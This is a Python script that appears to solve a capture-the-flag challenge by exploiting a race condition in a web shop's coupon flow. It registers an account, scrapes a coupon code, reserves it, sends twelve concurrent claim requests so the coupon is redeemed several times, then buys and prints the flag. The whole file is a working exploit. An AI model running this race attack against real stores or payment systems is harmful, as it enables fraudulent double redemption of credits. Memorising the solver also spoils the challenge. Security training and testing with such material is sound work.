import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import requests


def main():
    base_url = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"
    session = requests.Session()
    username = "coupon{0}".format(int(time.time()))
    password = "race123"

    register_response = session.post(
        base_url + "/register",
        data={"username": username, "password": password},
        timeout=5,
        allow_redirects=True,
    )
    register_response.raise_for_status()

    coupon_match = re.search(
        r"Coupon code:</strong>\s*([A-Z0-9-]+)",
        register_response.text,
    )
    if not coupon_match:
        raise SystemExit("Coupon code not found on dashboard.")
    coupon_code = coupon_match.group(1)

    reserve_response = session.post(
        base_url + "/reserve",
        data={"code": coupon_code},
        timeout=5,
        allow_redirects=True,
    )
    reserve_response.raise_for_status()
    cookies = session.cookies.get_dict()

    claim_match = re.search(r'action="(/claim/[^"]+)"', reserve_response.text)
    if not claim_match:
        raise SystemExit("Settlement slip not found after reserving the coupon.")
    claim_path = claim_match.group(1)

    def claim_once():
        requests.post(
            base_url + claim_path,
            cookies=cookies,
            timeout=5,
            allow_redirects=True,
        )

    with ThreadPoolExecutor(max_workers=12) as pool:
        futures = [pool.submit(claim_once) for _ in range(12)]
        for future in futures:
            future.result()

    purchase_response = requests.post(
        base_url + "/store/buy/flag",
        cookies=cookies,
        timeout=5,
    )
    purchase_response.raise_for_status()

    match = re.search(r"ASRCTF\{[^}]+\}", purchase_response.text)
    if not match:
        raise SystemExit("Flag not found after racing the coupon redeem flow.")

    print(match.group(0))


if __name__ == "__main__":
    main()
